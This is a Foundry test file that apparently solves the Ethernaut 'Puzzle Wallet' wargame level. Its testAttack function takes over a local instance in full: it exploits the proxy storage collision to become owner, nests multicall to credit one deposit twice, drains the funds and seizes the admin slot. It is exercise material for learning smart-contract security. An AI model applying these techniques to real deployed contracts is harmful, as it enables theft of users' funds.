// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test, console2} from "forge-std/Test.sol";

import {PuzzleProxy, PuzzleWallet} from "ethernaut/levels/PuzzleWallet.sol";
import {PuzzleWalletFactory} from "ethernaut/levels/PuzzleWalletFactory.sol";

// import {PreservationAttacker} from "../src/Preservation/PreservationAttacker.sol";

contract PuzzleWalletTest is Test {
    PuzzleWalletFactory public factory = new PuzzleWalletFactory();
    address public victim;

    address public attacker = address(this);

    function setUp() public {
        victim = factory.createInstance{value: 0.001 ether}(attacker);
    }

    function testAttack() external {
        PuzzleProxy(payable(victim)).proposeNewAdmin(attacker);

        PuzzleWallet(victim).addToWhitelist(attacker);

        // make a nested `multicall`, so that we can call `deposit` twice
        // that is we will get balances[msg.sender] = 0.002 ether while we only deposited 0.001 ether
        bytes[] memory outerCallDatas = new bytes[](2);
        bytes[] memory nestedCallDatas = new bytes[](1);

        bytes memory depositCallData = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        nestedCallDatas[0] = depositCallData;

        outerCallDatas[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, nestedCallDatas);
        outerCallDatas[1] = depositCallData;

        PuzzleWallet(victim).multicall{value: 0.001 ether}(outerCallDatas);

        PuzzleWallet(victim).execute(attacker, 0.002 ether, "");

        PuzzleWallet(victim).setMaxBalance(uint160(attacker));

        PuzzleProxy(payable(victim)).approveNewAdmin(attacker);

        assertTrue(factory.validateInstance(payable(address(victim)), attacker));
    }

    receive() external payable {}
}
